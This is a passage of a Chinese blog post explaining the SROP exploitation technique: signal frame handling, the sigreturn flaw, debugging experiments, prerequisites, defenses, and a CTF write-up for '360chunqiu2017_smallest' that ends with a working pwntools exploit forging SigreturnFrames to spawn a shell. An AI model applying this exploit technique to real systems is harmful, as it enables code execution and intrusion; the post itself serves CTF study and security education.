<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>关于SROP的学习总结 | ZIKH26's Blog</title><meta name="keywords" content="SROP"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。 在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。 什么是用户态和内核态？ 用户态： CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关">
<meta property="og:type" content="article">
<meta property="og:title" content="关于SROP的学习总结">
<meta property="og:url" content="https://zikh26.github.io/posts/e734c492.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。 在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。 什么是用户态和内核态？ 用户态： CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zikh26.github.io/img/huoche.jpeg">
<meta property="article:published_time" content="2023-05-23T06:40:58.161Z">
<meta property="article:modified_time" content="2023-05-23T06:40:58.161Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="SROP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zikh26.github.io/img/huoche.jpeg"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/e734c492"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '关于SROP的学习总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-23 14:40:58'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/huoche.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于SROP的学习总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-23T06:40:58.161Z" title="发表于 2023-05-23 14:40:58">2023-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-23T06:40:58.161Z" title="更新于 2023-05-23 14:40:58">2023-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">学习总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/e734c492.html" data-flag-title="关于SROP的学习总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。</p>
<p>在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。</p>
<h1>什么是用户态和内核态？</h1>
<h2 id="用户态：">用户态：</h2>
<p>CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关系）。此时的CPU不允许被独占，这就意味着此时的CPU可以被别的进程抢占。</p>
<h2 id="内核态：">内核态：</h2>
<p>此时的CPU可以访问任何数据，包括外围设备，比如网卡，硬盘等等。并且此时的CPU可以从一个程序切换到另外一个程序，并且没有进程能够抢占CPU，因为此时内核态的特权级为0.</p>
<h1>为什么要区分用户态和内核态？</h1>
<p>用户态和内核态说到底就是CPU所执行的指令权限不同而划分的，而这样做的目的就是为了保护系统，在CPU的所有指令中，有一些指令是非常危险的，如果错用，将导致整个系统崩溃。比如：清内存、设置时钟等。</p>
<h1>怎么从用户态切换到内核态？</h1>
<p>用户态切换到内核态的3种方式：</p>
<p>a. 系统调用（也是我们接下来要提到的重点）</p>
<p>这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如前例中fork()实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。</p>
<p>b. 异常</p>
<p>当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p>
<p>c. 外围设备的中断</p>
<p>当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p>
<p>这个博主对于用户态切换到内核态总结的很详细清楚，我这里就搬运一下。</p>
<p>原文链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47221702/article/details/119947155">(25条消息) 什么是用户态和内核态？_glory的博客-CSDN博客_内核态和用户态</a></p>
<p>这里这个系统调用很重要，它的存在意味着我们想执行一些较高权限的函数就需要经过系统调用来变成内核态从而得以实现函数的调用（例如read,write,open函数等等）。</p>
<h1>用户态的上下文是怎么被保存的？</h1>
<p>我们现在考虑一个问题，既然现在程序从用户态变成了内核态去执行系统调用的函数，那么再转变回用户态的时候，我们在用户态时寄存器的值怎么办？因为在内核执行系统调用函数的时候，寄存器的值一定是会发生改变的，可它是怎么保存了我们再用户态的上下文？</p>
<p>现在当我们要准备系统调用了。</p>
<p><img src="../img/2706180-20220219203837059-350353018.png" alt=""></p>
<p>图片转自<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p>
<p>过程①，内核会向进程发送一个signal（你可以把这个理解为中断信号），意思是接下来该进程被挂起，此刻由内核来接管。</p>
<p>过程②，内核会保存该进程在用户态的上下文，并且跳到已经注册好的Signal Handler（信号处理器），当这个Signal Handler返回的时候，内核控制去传递了一串user-space code （用户层代码），这里翻译成用户层代码可能不是特别准确，我想表达的意思是，<strong>这就是一串实现函数功能的代码并且处于在了用户层</strong>，并且这部分代码被称作signal trampoline。</p>
<p>过程③，它是在执行signal trampoline的过程。</p>
<p>过程④，内核将恢复之前保存的上下文，并且最后恢复进程的执行。</p>
<p>这是大体流程，接下来我们看一下保存上下文的细节。</p>
<p><strong>在第二步的时候，内核就会将我们的所有寄存器压栈，同时还会把signal信息以及rt_sigreturn压栈。这个ret_sigreturn是一个地址，这个地址指向了sigreturn的这个系统调用（这个系统调用时SROP利用的核心）</strong></p>
<p><img src="../img/2706180-20220219203845839-1367800712.png" alt=""></p>
<p>完成上述压栈之后，此时的栈布局是这样的，这段内存也被称为Signal Frame。</p>
<p>到了过程④的时候，此时的signal trampoline的执行已经到了最后的ret，此时的栈顶就是rt_sigreturn,因此又执行了re_sigreturn所指向的系统调用sigreturn的地址，<strong>这个系统调用函数的作用就是去把栈中的数据恢复到对应寄存器里面，也就是疯狂pop。</strong></p>
<p>随着rip的值也被pop了回去，此时的程序的系统调用已经完全完成，程序继续运行。</p>
<h1>SROP原理</h1>
<h2 id="理论部分">理论部分</h2>
<p>上述过程是正常的系统调用流程，而SROP则是利用了上下文保存与恢复的漏洞，如果了解了上述的内容，<strong>其实很明显就会发现有一个问题，在把寄存器压栈之后构造的Signal Frame依然是在用户进程的地址空间的，并且是用户进程可读写的。并且执行sigreturn的时候并没有检查准备恢复的这个Signal Frame是否是之前保存的Signal Frame</strong>。</p>
<p>这就给了我们可乘之机，我们可以去伪造一个Signal Frame然后直接执行sigreturn系统调用。</p>
<p>先看下正常的系统调用过程（主要看下保存与恢复上下文））<font color=red>（下面两个图，当时制作的时候理解的不太对，应该是执行signal trampoline,而并非是执行signal handler，这里要注意一下</font></p>
<p><img src="../img/2706180-20220219203856864-84934145.png" alt=""></p>
<p>接下来看看如果我们系统调用的是sigreturn**(这个sigreturn并<u>不是执行了其他系统调用被动执行的sigreturn</u>，而是<u>我们主动系统</u>调用的就是sigreturn)**</p>
<p><img src="../img/2706180-20220219203904231-699432548.png" alt=""></p>
<h2 id="实践部分">实践部分</h2>
<p>当然上面都是理论知识，我们动态调试看一下是不是这样。</p>
<p><img src="../img/2706180-20220219203910793-1182638386.png" alt=""></p>
<p><img src="../img/2706180-20220219203917580-709368108.png" alt=""></p>
<p>这是<strong>准备系统调用sigreturn之前的寄存器的值</strong>（此时的寄存器是将要被保存的上下文）和栈布局（<strong>此时栈的布局就是为了我们准确控制每一个寄存器的值）</strong></p>
<p><img src="../img/2706180-20220219203926667-105079808.png" alt=""></p>
<p>此时是系统调用sigturn之后的寄存器，可以看见参照构造的Signal Frame，精准的改变了每一个寄存器的值（此时execve的系统调用号以及参数全部被布置好了，此时只要执行了syscall就可以获取shell）</p>
<h2 id="提出一个猜想">提出一个猜想</h2>
<p>同时我们刚才理论上猜想的是主动执行了sigreturn然后执行execve是不会再让rt_sigreturn触发了（也就是不会再回到执行sigreturn之前了），<strong>那反过来就是说如果我们执行的不是execve，那最后rt_sigreturn还是会触发，也就是即使主动执行了sigreturn控制了我们想要的参数，但是系统调用结束之后，寄存器里还是我们最开始保存的参数，而非主动执行sigreturn布置的参数。</strong></p>
<h2 id="验证猜想">验证猜想</h2>
<p>为了验证上面的猜想，我们再用sigreturn来布置参数的时候，布置write（1,‘/bin/sh’,7)这个系统调用，并且使其返回地址为一个_term_proc函数（返回到一个空函数，不对本次实验产生任何影响）</p>
<p>这个是将要因为执行sigreturn系统调用而被保存的寄存器</p>
<p><img src="../img/2706180-20220219203934441-61755889.png" alt=""></p>
<p>这个是执行了sigreturn之后，布置的寄存器，此时还未执行write的系统调用。</p>
<p><img src="../img/2706180-20220219203941205-1069503757.png" alt=""></p>
<p>现在是执行write函数之后的寄存器，现在应该会恢复最开始的上下文了吧？</p>
<p><img src="../img/2706180-20220219203948580-1139524450.png" alt=""></p>
<p>what???居然没有恢复，和最开始的猜测不一样。</p>
<p>那我们重新捋一下，看看是哪里出了问题？</p>
<p>我们利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP/ESP和RIP/EIP都会被改变，可是为什么会这样呀？<strong>sigreturn本身不也是个系统调用么，那执行sigreturn之前的上下文也会被保存，执行sigreturn的时候确实会改变寄存器的值，可是执行sigreturn系统调用之后，原本的上下文不又被恢复了么（但事实是没有恢复）？</strong></p>
<h2 id="得出正确结论">得出正确结论</h2>
<p>这里卡了很久，roderick师傅给我的提示去看下sigreturn的官方文档。</p>
<p><img src="../img/2706180-20220219203956743-74555339.png" alt=""></p>
<p>果然，在官方文档的简介中就写了cleanup stack frame，这就意味着执行了sigreturn之后的函数栈帧就会被清除掉，当时我还感觉哪里不对，怎么栈（如下图）变成绿绿的了，原来是原本的栈已经都被清除了**（本来清除的应该是Signal Frame,但是由于这是我们主动调用的sigreturn，因此把我们真正的栈给当做Siganal Frame给清除了，因此原本系统调用sigreturn所保存的上下文也在此刻是被清除了，所以我们才没有在系统调用之后得到最开始的上下文）**。<br>
<img src="../img/2706180-20220219204003370-492577233.png" alt=""></p>
<h1>总结：</h1>
<p><strong>用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。</strong></p>
<h1>使用SROP的前提：</h1>
<p>1、首先程序必须存在溢出，能够控制返回地址。</p>
<p>2、可以去系统调用sigreturn（如果找不到合适的系统调用号，可以看看能不能利用read函数来控制RAX的值）</p>
<p>3、必须能够知道/bin/sh的地址，如果写的bss段，直接写地址就行，如果写到栈里，还需要想办法去泄露栈地址。</p>
<p>4、允许溢出的长度足够长，这样可以去布局我们想要的寄存器的值</p>
<p>5、需要知道syscall指令的地址</p>
<h1>补充：一直劫持程序的控制流</h1>
<p>最后要补充的一点是，前面介绍的方法只能调用一个syscall，然后我们就失去了对执行流的控制了，这里我们其实是可以一直劫持程序的控制流的。</p>
<p><img src="../img/2706180-20220219204011362-2119817764.png" alt=""></p>
<p>图片出自<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&amp;utm_term=sigreturn+%E5%87%BD%E6%95%B0&amp;spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<p>依据图片我们可以发现，我们每次控制寄存器的时候，都把rsp写成下一个片段的rt_sigreturn的地址，并且rip的地址要指向syscall；ret  一定要后面有ret，不然所有的片段连不起来，到ret的时候，就会去执行rsp执行的地址，因此我们就可以一直劫持程序的控制流。</p>
<h1>防御手段：</h1>
<p>最后我们来提一下SROP的防范。从三个角度出发，作者提出了三种方法：</p>
<p><em><strong>*Gadgets Prevention*</strong></em></p>
<p>在<code>两个重要的gadgets</code>这章我提到，在当前的几种不同的操作系统中，<code>sigreturn</code>和<code>syscall; ret</code>这两个gadgets非常容易被找到，特别是在<code>vsyscall</code>这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让ASLR等保护机制物尽其用，使得攻击者很难找到这些gadgets。</p>
<p>当然这种方法并不能从本质上解决SROP的问题。</p>
<p><em><strong>*Signal Frame Canaries*</strong></em></p>
<p>这种方法借鉴于<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">stack canaries</a>机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。</p>
<p>当然，针对stack canaries的攻击也很多，其同样不能从本质上防止SROP的发生。</p>
<p><em><strong>*Break kernel agnostic*</strong></em></p>
<p>这就要追溯到SROP的本质问题了，就是内核对Signal的不可知性。如果我们在内核处理<code>sigreturn</code>系统调用的时候判断一下当前的<code>Signal Frame</code>是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p>
<p>我认为这个作者提到的这三个防御手段都非常全面，因此我就直接从这篇博客引用了<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&amp;utm_term=sigreturn+%E5%87%BD%E6%95%B0&amp;spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<h1>实战SROP</h1>
<h2 id="360chunqiu2017-smallest">360chunqiu2017_smallest</h2>
<p><img src="../img/2706180-20220220190258944-2045243642.png" alt=""></p>
<p>可以发现这个程序只有唯一个函数，就是这个start函数（看网上的师傅说这是因为出题人用汇编写的这个程序，编译之后也不需要与库链接）。</p>
<p>这就是一个read系统调用，然后就没有能利用的地方了，其实看到这个唯一的系统调用就应该往SROP的方向去想了，因为别的很多方法都不可能靠这个一个start函数完成，但是<strong>只要允许输入的长度够长，同时还有read的系统调用就可以考虑使用SROP（因为系统调用read就意味着肯定会有syscall，同时由于read返回值的特性，我们是可以控制rax的值，这也就有机会系统调用sigreturn）</strong></p>
<p>现在其实最大的问题是怎么去泄露栈的地址？我们可以第一次read读入一个字符，去让系统调用号变成1，但是这就意味着我们无法控制返回地址。这里用了已经很巧妙的方法，由于每一次输入都是从栈顶开始存入数据，如果我们第一次<strong>连续输入了两个start的首地址</strong>（但事实上这里是要输入三个start的地址，不过现在我们先不讨论第三个start的作用），然后**执行了ret，此时第一个start的地址就被pop出来了，也就是说现在栈顶只有一个start地址了，同时我们现在又到了系统调用read这里，然后我们只写一个字节\xB3,这样start的地址0x4000B0就被修改成了0x4000B3，**这样使得我们的RAX里面现在的值就是1了，同时下一次返回的时候跳过了第一个指令xor rax,rax，直接从mov edx,0x400指令开始，最终实现系统调用write，从而实现栈地址泄露。（可以看见下图的左侧栈顶是0x4000b0而执行了read之后，右侧的栈顶已经是0x4000b3了）</p>
<p><img src="../img/2706180-20220220190308888-853157541.png" alt=""></p>
<p>不过紧接着遇见的问题就是会发现由于只有一个函数的原因，栈底直接就是环境变量了，因此泄露出来的全都是环境变量（如下图）。</p>
<p><img src="../img/2706180-20220220190316234-993019298.png" alt=""><br>
而环境变量中没有任何一个内存单元指向栈地址，因此我们没法用具体的偏移直接计算，不过好消息是，<strong>由于栈地址随机化的地址变化并不是太大，因此我们可以选取一片空的栈区去存放我们的参数和signal frame（通过泄露的地址直接减去一个较大的数据来指向这片栈区)</strong>。</p>
<p>最后的难点就是我们的system call chains的构建，<strong>由于我们肯定是用一次sigreturn然后控制参数去调用read（因为我们要把参数写入指定的地址），但是由于我们没办法直接系统调用 sigreturn，需要间接的用read函数来控制RAX在系统调用才行，并且还需要一次sigreturn去控制参数调用execve</strong>。</p>
<p>这里也是用了一个非常巧妙的手法，由于要控制RAX为15，这就意味着我们只能输入15个字节的内容，可是我们还需要去构造signal frame，因此我们分两次完成，第一次输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br></pre></td></tr></table></figure>
<p>这个start可以让我们再输入一次，而此时把frame给构建到栈里面，这八个a则是负责去占一个位置（如下图）</p>
<p><img src="../img/2706180-20220220190323742-16754978.png" alt=""></p>
<p>第二次输入，这样syscall就到了原本八个a占的位置，而七个b则是为了凑齐十五个字节（如下图）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="../img/2706180-20220220190329950-517103708.png" alt=""></p>
<p>按照这两次payload就可以实现sigreturn调用了。</p>
<p>然后就没什么了，最后要注意一下，第二次执行sigreturn的第一个payload顺便把参数给发送过去，然后用我们在系统调用read的那个rsi配合偏移来获取/bin/sh的地址即可。</p>
<p>最后的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x4000BE</span></span><br><span class="line">start_addr=<span class="number">0x4000B0</span></span><br><span class="line">payload=p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&#x27;\xB3&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0x400</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=target_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr+<span class="number">0x110</span> <span class="comment">#此时加上0x110才是/bin/sh的地址</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=p64(start_addr)+<span class="string">&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">str</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload=p64(syscall_ret_addr)+<span class="string">&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BUUCTF-ciscn-2019-es-7">BUUCTF_ciscn_2019_es_7</h2>
